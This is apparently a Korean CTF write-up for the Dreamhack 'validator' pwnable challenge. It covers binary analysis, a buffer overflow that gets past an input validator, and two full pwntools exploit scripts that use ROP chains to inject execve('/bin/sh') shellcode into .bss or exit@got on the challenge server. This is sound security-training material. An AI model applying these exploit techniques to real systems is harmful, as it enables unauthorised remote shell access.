---
title: validator
description: Dremhack [Wargame] - validator
author: juhyeongkim
date: 2024-10-31 08:00:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
#   path: 
#   lqip: 
#   alt: 
---
## 문제 설명 및 바이너리 분석

---
취약한 인증 프로그램을 익스플로잇해 flag를 획득하세요!

Hint: 서버 환경에 설치된 5.4.0 이전 버전의 커널에서는, NX Bit가 비활성화되어 있는 경우 읽기 권한이 있는 메모리에 실행 권한이 존재합니다. 5.4.0 이후 버전에서는 스택 영역에만 실행 권한이 존재합니다.

---
<img width="1115" alt="image" src="https://github.com/user-attachments/assets/f8c6c451-6021-4999-92fb-8526fa28f0c3">

<img width="709" alt="image" src="https://github.com/user-attachments/assets/1b717225-5e69-42ba-ac96-8e122e998b7c">

먼저, 해당 문제에 적용된 보호 기법이 거의 존재하지 않기 때문에 다양한 공격 패턴이 가능할 것을 예측할 수 있다.

그리고 이번 문제는 다른 문제들과 달리, 바이너리만 존재하고 소스 코드는 존재하지 않는다.

따라서, `validator_dist`와 `validator_server` 바이너리를 분석하여 문제를 풀어야 한다.

---

참고로, 아래에서도 설명하겠지만 `validator_server`는 **IDA**로 분석이 힘들고 `validator_dist`만 바로 분석이 가능하다.

`dist`는 **Distribution**의 약자로 배포판을 의미하기 때문에, 이번 문제에서는 `dist`로 분석한 후 `server`에 해당 취약점으로 공격을 하면 같은 기법으로 공격이 가능하다.

---

그럼 이제 두 바이너리를 한번 실행해보면 아래와 같이 둘다 이용자에게 입력을 받은 후, 입력이 끝나면 바로 바이너리가 종료된다.

<img width="653" alt="image" src="https://github.com/user-attachments/assets/de44fe89-2821-4131-a1dc-1ce37b22264f">

**gdb**를 통해 한번 두 바이너리를 분석해보자.

<img width="556" alt="image" src="https://github.com/user-attachments/assets/976211c5-3cf3-42a3-8506-37c691fcc19e">

먼저, 위 이미지는 `validator_dist` 바이너리의 `main` 함수를 디스어셈블한 결과이다.

<img width="491" alt="image" src="https://github.com/user-attachments/assets/6d74f02b-2cf3-4313-9c3a-90ef36c8e052">

이 부분을 살펴보면, `read()` 함수를 통해 `[rbp-0x80]`이 가리키는 주소에 `0x400` 크기의 데이터를 입력받기 때문에 **BOF** 취약점이 존재하는 것을 알 수 있고, 입력이 끝난 이후에는 `validate` 함수를 호출한다.

**BOF** 취약점이 존재하며, **canary**가 없기 때문에 **RAO** 공격이 가능할 것을 미리 생각해볼 수 있다.

다시 돌아와서 `diass validate` 명령어를 통해 해당 함수의 내용도 디스어셈블 해보며 관찰해봤는데, 위에서 `[rbp-0x80]`에 입력된 값과 특정값을 1바이트씩 계속 비교하며 반복해나가는 코드가 보였다.

만약 입력값과 특정값이 다르다면, `jmp`를 통해 `exit` 함수를 호출하며 종료하게 되었다.

디스어셈블된 결과를 보고, 한 바이트씩 차분히 특정값의 패턴을 찾으며 어떤 입력값을 전달해야 하는지 찾을 수 있지만, 이보다 **IDA**를 통해 `validate` 함수를 **디컴파일**하여 파악하는 것이 훨씬 쉽다.

이번에는 디컴파일 방법으로 문제를 풀이하고, 다음에 [링크](https://velog.io/@yyj0110/Dreamhack-Validator)에 잘 정리된 내용을 참고해서 디스어셈블된 결과를 리버싱하여 문제를 풀어보는 방법도 한번 해봐야겠다.

그럼 **IDA**로 `validate` 함수를 디컴파일 해보기 전에 `validator_server` 바이너리도 한번 **gdb**를 통해 분석해보자.

`validator_server` 바이너리를 **gdb**를 통해 분석해봤는데, `disass main` 명령어로 찾아봐도 `main` 함수가 존재하지 않고, `info func` 명령어로는 아래의 세 함수만 존재했다.

<img width="453" alt="image" src="https://github.com/user-attachments/assets/813132e8-0c25-4aaf-8bbc-a7b0b82638a4">

그 이유는 `validator_server` 바이너리가 **stripped** 되어있기 때문이다.

바이너리가 **stripped** 되어있다는 것은, 바이너리를 디버깅하기 위해 필요한 심볼 정보들이 제거되있다는 의미이다.

`file` 명령어를 통해 `validator_dist`와 `validator_server`를 비교해보면 아래와 같이 마지막에 **stripped** 되어있는지 여부가 나온다.

<img width="1355" alt="image" src="https://github.com/user-attachments/assets/63e7e3d2-6787-4007-93f9-fa01c37df91d">

따라서, `validator_server`는 gdb를 통해 일반 바이너리들과 똑같은 방법으로 분석을 하기 힘들다.

어쩌피 이번 문제에서는 `validator_dist` 배포판으로 분석한 후, 서버에 공격할 때는 똑같은 바이너리인 `validator_server`로 공격하면 되서 `validator_server` 자체를 로컬에서 분석할 필요는 없지만,

만약 **stripped** 된 파일을 분석하기 위해서는 아래와 같은 명령어를 통해 **Entry point address**를 찾아서, 해당 주소에 breakpoint를 설정한 후,

```
readelf -a ./binary | more
```

`-a`는 바이너리의 모든 정보를 출력하는 옵션이며, `| more`은 출력 값이 너무 길어지는 것을 방지하기 위해 `more`으로 한 페이지 단위만 짤라서 먼저 보여주는 것이다. 

<img width="812" alt="image" src="https://github.com/user-attachments/assets/4729be66-6813-4715-8b37-4cacca78d59b">

<img width="233" alt="image" src="https://github.com/user-attachments/assets/9b8764ad-af28-4ca4-9218-23ece33cfcf7">

이제 breakpoint 까지 실행을 해서 중단해보면, 아래와 같이 `main` 함수를 호출하기 위한 `__libc_start_main` 함수가 나온다.

<img width="622" alt="image" src="https://github.com/user-attachments/assets/123a3dd6-2315-4368-a7ef-077a3089e897">

`__libc_start_main`을 호출하기 전에 설정해주는 `rdi` 레지스터의 값이 `main` 함수의 주소를 가리키기 때문에,

설정해준 `rdi` 값에 breakpoint를 걸고 `continue`를 해보면, `validator_dist`에서 본 `main`과 같은 함수가 실행되는 것을 알 수 있다.

<img width="991" alt="image" src="https://github.com/user-attachments/assets/5ed357d9-66a1-4577-960e-f93ccb4073b2">

따라서, 로컬에서 `validator_dist`만 분석한 후 서버에 공격할 때는 `validator_server` 바이너리를 공격하면 되겠다는 확신을 할 수 있다.

참고로, **IDA**를 통해 **stripped**된 바이너리를 분석하는 것은 gdb와 달리 쉽지 않기 때문에, 다음에 한번 [링크](https://kimtruth.github.io/2021/06/27/stripped-PIE-tip/)를 참고해서 분석해보자.

그럼 이제, **IDA**를 통해 `validator_dist`를 정적 분석해보며 취약점을 분석해보고 Exploit을 설계해보자.

<br>

## **validator_dist** 바이너리 분석

이제 IDA를 켜서 `validator_dist` 바이너리를 분석해보자.

<img width="550" alt="image" src="https://github.com/user-attachments/assets/b01092fd-7dff-40f7-8bb2-51e84dd14ec5">

먼저 위와 같이, 가장 먼저 나오는 `main` 함수의 디스어셈블 결과에 **F5** 단축키를 입력해서 **디컴파일**한 결과를 살펴보자.

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[128]; // [rsp+0h] [rbp-80h] BYREF

  memset(s, 0, 0x10uLL);
  read(0, s, 0x400uLL);
  validate(s, 128LL);
  return 0;
}
```

그럼 위와 같이 `main` 함수가 디컴파일된 결과를 살펴볼 수 있고, gdb에서 살펴본 것과 같이 `s` 라는 배열에 `0x400` 크기의 값을 입력 받는다.

`s`는 `[rbp-0x80]`에 저장되어 있었던 것을 기억하고, `validate` 함수를 호출할 때는, `s`와 해당 배열의 크기인 `128(0x80)`을 넘겨준다.

그럼 이제 `validate` 함수를 더블클릭해서, 해당 함수의 내용을 분석해보자.

```
__int64 __fastcall validate(__int64 a1, unsigned __int64 a2)
{
  unsigned int i; // [rsp+1Ch] [rbp-4h]
  int j; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 9; ++i )
  {
    if ( *(_BYTE *)((int)i + a1) != correct[i] )
      exit(0);
  }
  for ( j = 11; a2 > j; ++j )
  {
    if ( *(unsigned __int8 *)(j + a1) != *(char *)(j + 1LL + a1) + 1 )
      exit(0);
  }
  return 0LL;
}
```

먼저, 첫 번째 반복문을 살펴보자. 

함수의 첫 번째 인자로 받은 `a1`은 `main`에서 `char s[128]`인데, 여기서 `__int64`로 받기 때문에 배열이 아닌 정수로 해석된다.

따라서, `*(_BYTE *)`로 타입 변환을 통해 `char` 타입을 저장하는 배열로 해석한 후, 배열의 원소를 가리키도록 한다.

이제 `i`가 0부터 9까지 반복문을 순회하며, 함수의 첫 번째 인자인 `a1` 배열에 인덱스 역할을 하는 `i`를 더한 후, `correct[i]` 값과 `a1`의 원소인 `a1[i]`가 다른 경우 `exit(0);`으로 종료한다.

`correct` 배열의 값은, 배열 이름을 더블클릭해보면 아래와 같이 `"DREAMHACK!"` 문자열이 10바이트 저장된 것을 확인할 수 있다.

여기서 `exit` 함수를 통해 종료되지 않고 검증을 넘어가기 위해서는, `main` 함수에서 호출되는 `read` 함수를 통한 입력에서, `s`의 인덱스 0부터 9까지 저장되어야 하는 문자열은 `"DREAMHACK"`이다.

---

그럼 다음으로 넘어가서 두 번째 반복문을 살펴보자.

같은 방식으로 함수의 첫 번째 인자를 `*(unsigned __int8 *)`를 통해 `char` 타입을 저장하는 배열로 해석한 후, 배열의 원소를 가리키도록 한다.

그리고 배열의 인덱스를 나타내는 `j`는, 11부터 함수의 두 번째 인자인 `a2` 보다 작을 때 까지 증가시키며 비교를 하는데,

`a1[j] != a1[j + 1] + 1`을 만족하는 경우 `exit(0);`를 호출하며 함수가 종료하게 된다.

따라서 이 검증을 넘어가기 위해서는 인덱스 `11`부터 인자로 전달해준 `127`까지 서로 이웃한 인덱스의 원소는, 메모리에 저장된 바이트 값을 기준으로 `1`만큼 차이가 나도록 내림차순으로 저장되어야 한다.

여기서 매우 주의할 점이, 마지막 인덱스인 `a1[127]`에서 `a1[128]`과 비교를 하기 때문에, `a[128]` 까지도 데이터를 입력해야 한다는 것이다. 

따라서, `main` 함수에서 호출되는 `read` 함수를 통한 입력해서 **인덱스 11부터 128까지** 저장되어야 하는 문자열은, Exploit 코드에서 반복문을 통해 **127부터 10까지** 정수 값을 저장해주면 될 것이다.

참고로, `read` 함수는 널 문자 또는 개행 문자를 만나도 입력을 계속 받기 때문에 입력 값의 범위는 `-128 ~ 127`에만 해당된다면 신경쓰지 않아도 된다. (내가 갑자기 헷갈렸어서)

그리고 인덱스가 10인 부분은 검증하지 않기 때문에 아무 값이나 전달해줘도 되고, 이 부분을 놓치면 마지막 127번째 인덱스까지 채워지지 않기 때문에 이를 잘 유의하자.

그럼 이제, `validator_dist` 바이너리에서 `validate` 함수를 통한 검증은 통과할 방법을 설계하였으니, 바이너리의 취약점을 분석해보며 Exploit 계획을 세워보자.

<br>

## 취약점 분석

해당 바이너리의 보호기법을 다시 한번 살펴보자.

<img width="1115" alt="image" src="https://github.com/user-attachments/assets/f8c6c451-6021-4999-92fb-8526fa28f0c3">

먼저, 해당 바이너리에는 **PIE**가 존재하지 않고 **Partial RELRO**가 적용되어 있기 때문에, 바이너리 베이스를 구하지 않고 쉽게 **GOT Overwrite**가 가능하며, 

`read(0, s, 0x400)` 에서 **BOF** 취약점이 존재하고 카나리도 존재하지 않기 때문에, 쉽게 **ROP 가젯**을 활용한 **RAO** 공격이 가능하다.

스택에는 실행 권한이 존재하긴 하지만, 예를 들어 `r2s` 워게임 문제와 다르게 스택의 주소를 출력해주는 부분이 없기 때문에, 쉘코드를 주입할 스택의 주소를 알 수 없다.

따라서, 스택에 쉘코드를 주입하는 것 대신 **GOT Overwrite** 공격을 통해 문제를 풀이할 수 있다.

그리고 이 문제의 설명을 보면, `5.4.0` 이전 버전의 커널에서는, `NX Bit`가 비활성화되어 있는 경우 읽기(`R`) 권한이 존재하는 메모리에 실행(`X`)권한이 존재한다고 되어있다.

따라서 **GOT Overwrite**뿐만 아니라, 읽기 권한이 존재하는 `.bss` 주소에 쉘 코드를 주입한 후 `bss` 주소로 Return하여 **Shellcode execute** 공격이 가능하다.

결론적으로 처음에 아래의 Exploit 방법들을 생각해봤다.

1. `bss` 영역에 `shellcraft`를 활용한 쉘코드 Overwrite (`5.4.0` 이전의 버전에서만 가능)

2. **GOT Overwrite** 공격으로 `exit@got`에 `shellcraft`를 활용한 쉘코드 Overwrite (버전에 상관없이 가능)

그럼 이제 아래에서 하나씩 Exploit을 수행해보자.

<br>

## Exploit

일단 Exploit을 하기 전에 `validate` 함수를 통과하기 위해 `read` 함수를 통해, 앞에 보내줘야 하는 Payload를 작성해야 한다.

`[rbp-0x80]`에 저장된 `char c[128]` 배열의 인덱스 **0부터 9까지**는 `"DREAMHACK!"` 문자열이 저장되어야 하고,

인덱스 **10**은 아무 값이나, 그리고 인덱스 **11부터 128까지**는 메모리에 저장된 값이 `1`만큼 차이나도록 내림차순으로 작성하면 된다.

인덱스를 꼭 **128**까지 입력해줘야 하는 것 기억하고, 그렇게 되면 **SFP**의 첫번째 바이트(LSB)에 값이 하나 더 들어가기 때문에,

SFP를 덮을 때는 **8bytes가 아닌 7bytes만** 덮어야 한다.

Payload를 구성하는 코드는 아래와 같다.

```
# [1] validate

payload = b"DREAMHACK!"  # index : 0 ~ 9
payload += b'A'          # index : 10

# index : 11 ~ 128 (s[128]에도 대입해줘야 s[127]의 비교에서 exit가 발생하지 않음)
for i in range(127, 9, -1):   # 127 ~ 10 까지 -1씩 감소시키며 (char 범위는 -128 ~ 127 이므로, 범위를 127부터 해줘야함)
    payload += bytes([i])     # 바이트 문자열로 변환
    # payload += p8(i)        # 이렇게 해도됨

payload += b'a' * 0x7         # SFP : 앞에서 SFP의 첫번째 바이트까지 넘어왔기 때문에 7바이트만 덮어야함
```

SFP를 생각하기 까다롭기 때문에, 다음에 할 때는 그냥 인덱스 10부터 한번에 SFP까지 덮는 아래의 코드를 사용해도 된다.

```
payload = b"DREAMHACK!"  # index : 0 ~ 9

# index : 10 ~ 128 + SFP -> 총 126 바이트
for i in range(126, 0, -1):   # 127 ~ 1 까지 -1씩 감소시키며
    payload += bytes([i])     # 바이트 문자열로 변환
    # payload += p8(i)        # 이렇게 해도됨
```

그럼 **ROP**, **GOT Overwrite**, **Shellcode execute** 등 여러 방법으로 공격을 수행해보자.

<br>

### 1. **bss** 영역에 **shellcraft**를 활용한 쉘코드 Overwrite (**5.4.0** 이전의 버전에서만 가능)

**RAO** 공격을 통해 ROP 체인을 통해 `bss`의 주소에 `shellcraft`를 통해 찾은 **Shellcode**를 주입하여 임의의 쉘코드를 실행하는 방법으로 공격을 할 수 있다.

앞에서도 계속 설명했지만 `5.4.0` 이전의 커널 버전에서만, 이번 바이너리에서처럼 **NX Bit**가 비활성화된 경우 읽기 권한이 존재하는 `bss` 영역에 실행 권한이 존재하여 **Shellcode execute**가 가능하다.

ROP 가젯은 `pwntools`의 `find_gadget()` 함수를 쓰거나, 쉘에서 아래의 명령어로 구할 수 있다.

```
ROPgadget --binary validator_dist | grep 'pop rdi'
```

`bss` 영역의 주소는 **PIE**가 적용되어 있지 않기 때문에 `elf.bss()`를 통해 구할 수 있고, `shellcode`는 `shellcraft.execve("/bin/sh", 0, 0)` 또는 `shellcraft.sh()`을 사용하면 된다.

그리고 `shellcraft`는 쉘 코드에 해당하는 어셈블리 코드를 문자열로 리턴하기 때문에, `asm` 함수를 통해 해당 어셈블리 코드를 머신 코드로 변환한 바이트 문자열로 변환해서 전달해야 한다.

<img width="1207" alt="image" src="https://github.com/user-attachments/assets/84fd2394-beb5-4a27-a7b1-9cf7f23efe11">

그럼 이제, **BOF** 취약점을 통해 가능한 **RAO** 공격과 **ROP 가젯**을 통해, 아래의 `read` 함수를 실행하도록 하고, `bss` 영역에 `shellcode`를 대입해준 후 `bss` 영역으로 이동하면 쉘코드가 실행될 것이다.

```
read(0, bss, len(shellcode))
```

전체 Exploit 코드는 아래와 같으며, `p.send()`를 보내기 전에 `sleep(0.5)`로 텀을 두지 않으면 쉘이 바로 종료되는 오류가 발생해서 이 부분을 주의하자.

```
from pwn import *

context.arch = "amd64"

p = remote('host3.dreamhack.games', 9820)
elf = ELF('./validator_server')
r = ROP(elf)


# [1] validate

payload = b"DREAMHACK!"  # index : 0 ~ 9
payload += b'A'          # index : 10

# index : 11 ~ 128 (s[128]에도 대입해줘야 s[127]의 비교에서 exit가 발생하지 않음)
for i in range(127, 9, -1):   # 127 ~ 10 까지 -1씩 감소시키며 (char 범위는 -128 ~ 127 이므로, 범위를 127부터 해줘야함)
    payload += bytes([i])     # 바이트 문자열로 변환
    # payload += p8(i)        # 이렇게 해도됨

payload += b'a' * 0x7         # SFP : 앞에서 SFP의 첫번째 바이트까지 넘어왔기 때문에 7바이트만 덮어야함

# index : 10 ~ 128 + SFP -> 총 126 바이트
# for i in range(126, 0, -1):  # 127 ~ 1 까지 -1씩 감소시키며
#     payload += bytes([i])     # 바이트 문자열로 변환
#     # payload += p8(i)        # 이렇게 해도됨

print(len(payload))

# [2] ROP
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_pop_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx = r.find_gadget(['pop rdx', 'ret'])[0]
# ret = r.find_gadget(['ret'])[0]

shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))
# shellcode = asm(shellcraft.sh()) # 이것도 사용 가능
bss = elf.bss()

read_plt = elf.plt['read']

# payload += p64(ret)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_pop_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(len(shellcode))
payload += p64(read_plt)

payload += p64(bss)

# main의 read
sleep(0.5)
p.send(payload)

# ROP의 read
sleep(0.5)
p.send(shellcode)

p.interactive()
```

<br>

### 2. GOT Overwrite 공격으로 **exit@got**에 **shellcraft**를 활용한 쉘코드 Overwrite (버전에 상관없이 가능)

바로 앞의 방식에서, `bss` 영역에 `shellcode`를 Overwrite하는 대신 바이너리에 존재하는 `exit@got`에 `shellcode`를 Overwrite 하면 된다.

이번 문제는 **PIE**도 적용되어있지 않기 때문에, **GOT Overwrite**를 위해 PIE base를 구해주지 않아도 되서 거의 같은 난이도로 풀이가 가능하다.

익스플로잇 코드는 아래와 같고, `bss`를 `exit@got`로 바꿔주면 끝이다. 

참고로, 어쩌피 `exit@got`가 아니라 `read@got`로 해줘도 Overwrite 이후에 `read` 함수가 사용되지 않기 때문에 공격이 가능하다. 

주의할 점은 `got`가 아닌 `plt`를 마지막에 호출해주거나, 똑같은 논리로 어쩌피 마지막에 `exit`가 호출될 것이기 때문에 `exit@got`로 Return하는 코드를 없애면 Exploit이 불가능하다.

그 이유는 나중에 정확히 알아보고 추가하겠지만, 아래의 두 이유 중 하나로 예측하고 있다.

---
1.
`plt`를 호출하면, 인자를 설정하는 과정에서 오류가 발생해서 쉘코드가 정상적으로 실행되지 않는다.

---
2.
`plt`를 통해 `got`를 참조할 때 `got`에 적힌 **함수의 주소**를 따라가서 실행한다. 

**그런데 여기서 GOT Overwrite를 할 때는 일반적인 방법처럼 `system` 함수나 `get_shell`의 주소를 대입하는 것이 아니라, `shellcode`인 머신 코드 자체를 대입한다.**

따라서, `plt`를 통해서는 `got`에 적힌 쉘코드 `instruction` 자체를 수행할 수 없고, `got` 주소로 직접 Return address를 조작해서 점프해야 쉘코드를 실행할 수 있다.

**RAO** 공격에서 Return address로 이동할 때는, Return address에 적힌 주소(`exit@got`)로 이동하여, 해당 주소에 적혀있는 **instruction**(`shellcode`)을 바로 수행하기 때문이다.

---

```
from pwn import *

context.arch = "amd64"

p = remote('host3.dreamhack.games', 9820)
elf = ELF('./validator_server')
r = ROP(elf)


# [1] validate

payload = b"DREAMHACK!"  # index : 0 ~ 9
payload += b'A'          # index : 10

# index : 11 ~ 128 (s[128]에도 대입해줘야 s[127]의 비교에서 exit가 발생하지 않음)
for i in range(127, 9, -1):   # 127 ~ 10 까지 -1씩 감소시키며 (char 범위는 -128 ~ 127 이므로, 범위를 127부터 해줘야함)
    payload += bytes([i])     # 바이트 문자열로 변환
    # payload += p8(i)        # 이렇게 해도됨

payload += b'a' * 0x7         # SFP : 앞에서 SFP의 첫번째 바이트까지 넘어왔기 때문에 7바이트만 덮어야함

# index : 10 ~ 128 + SFP -> 총 126 바이트
# for i in range(126, 0, -1):  # 127 ~ 1 까지 -1씩 감소시키며
#     payload += bytes([i])     # 바이트 문자열로 변환
#     # payload += p8(i)        # 이렇게 해도됨

print(len(payload))

# [2] ROP
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_pop_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
pop_rdx = r.find_gadget(['pop rdx', 'ret'])[0]
# ret = r.find_gadget(['ret'])[0]

shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))
# shellcode = asm(shellcraft.sh()) # 이것도 사용 가능

exit_plt = elf.plt['exit']
exit_got = elf.got['exit']

read_plt = elf.plt['read']

# payload += p64(ret)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_pop_r15) + p64(exit_got) + p64(0)
payload += p64(pop_rdx) + p64(len(shellcode))
payload += p64(read_plt)

payload += p64(exit_got)

# main의 read
sleep(0.5)
p.send(payload)

# ROP의 read
sleep(0.5)
p.send(shellcode)

p.interactive()
```

<br>

### 참고

위 두 방식이 훨씬 편리한 방법이긴 하지만, `rop` 워게임에서처럼 `libc`에 존재하는 심볼간의 오프셋을 통해 `system` 함수의 주소를 찾아서 `exit@got`에 Overwrite 하는 방법도 생각해보았다.

근데 해당 바이너리에는 `write@plt`가 존재하지 않아서, `read_got`에 저장된 값(`libc`의 `read` 함수가 실제로 바이너리에 매핑된 주소)를 구할 수 없기 때문에, `system` 함수의 오프셋도 구할 수 없게 되어 해당 방법을 사용할 수 없다.